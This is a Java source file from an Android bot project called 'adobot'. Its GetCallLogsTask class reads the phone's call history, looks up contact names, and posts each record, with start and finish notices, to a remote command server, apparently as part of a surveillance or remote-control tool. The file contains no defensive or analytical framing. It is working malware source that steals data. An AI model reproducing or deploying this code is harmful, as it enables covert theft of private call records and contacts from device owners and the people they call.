package com.android.adobot.tasks;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.android.adobot.AdobotConstants;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;

import com.android.adobot.http.Http;
import com.android.adobot.http.HttpRequest;

public class GetCallLogsTask extends BaseTask {

    private static String TAG = "GetCallLogsTask";
    private int numlogs;

    public GetCallLogsTask(Context client, int numlogs) {
        setContext(client);
        this.numlogs = numlogs;
    }

    @Override
    public void run() {
        super.run();
        getCallLogs();
    }

    private void getCallLogs() {


        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {

            HashMap start = new HashMap();
            start.put("event", "getcallhistory:started");
            start.put("uid", commonParams.getUid());
            start.put("device", commonParams.getDevice());
            Http startHttp = new Http();
            startHttp.setUrl(commonParams.getServer() + AdobotConstants.NOTIFY_URL);
            startHttp.setMethod(HttpRequest.METHOD_POST);
            startHttp.setParams(start);
            startHttp.execute();

            String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
            Uri callUri = Uri.parse("content://call_log/calls");
            Cursor mCur = context.getApplicationContext().getContentResolver().query(callUri, null, null, null, strOrder);
            int id = mCur.getColumnIndex(CallLog.Calls._ID);
            int number = mCur.getColumnIndex(CallLog.Calls.NUMBER);
            int type = mCur.getColumnIndex(CallLog.Calls.TYPE);
            int date = mCur.getColumnIndex(CallLog.Calls.DATE);
            int duration = mCur.getColumnIndex(CallLog.Calls.DURATION);

            if (mCur.moveToFirst()) {
                do {
                    Log.i(TAG, "This number: " + this.numlogs);
                    String phNumber = mCur.getString(number);
                    String nameS = getContactName(phNumber);
                    String callType = mCur.getString(type);
                    String callDate = mCur.getString(date);
                    Date callDayTime = new Date(Long.valueOf(callDate));
                    SimpleDateFormat dt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    String callDuration = mCur.getString(duration);

                    HashMap p = new HashMap();
                    p.put("uid", commonParams.getUid());
                    p.put("call_id", Integer.toString(id));
                    p.put("type", callType);
                    p.put("phone", phNumber);
                    p.put("name", nameS);
                    p.put("date", dt.format(callDayTime));
                    p.put("duration", callDuration);

                    Http req = new Http();
                    req.setMethod(HttpRequest.METHOD_POST);
                    req.setUrl(commonParams.getServer() + AdobotConstants.POST_CALL_LOGS_URL);
                    req.setParams(p);
                    req.execute();
                    this.numlogs--;
                } while (mCur.moveToNext() && this.numlogs > 0);
            }

            start.put("event", "getcallhistory:done");
            start.put("uid", commonParams.getUid());
            start.put("device", commonParams.getDevice());
            Http doneHttp = new Http();
            doneHttp.setUrl(commonParams.getServer() + AdobotConstants.NOTIFY_URL);
            doneHttp.setMethod(HttpRequest.METHOD_POST);
            doneHttp.setParams(start);
            doneHttp.execute();

            mCur.close();
        } else {

            Log.i(TAG, "No SMS permission!!!");
            HashMap noPermit = new HashMap();
            noPermit.put("event", "nopermission");
            noPermit.put("uid", commonParams.getUid());
            noPermit.put("device", commonParams.getDevice());
            noPermit.put("permission", "READ_CALL_LOG");
            Http doneSMS = new Http();
            doneSMS.setUrl(commonParams.getServer() + AdobotConstants.NOTIFY_URL);
            doneSMS.setMethod(HttpRequest.METHOD_POST);
            doneSMS.setParams(noPermit);
            doneSMS.execute();

            requestPermissions();
        }

    }
}
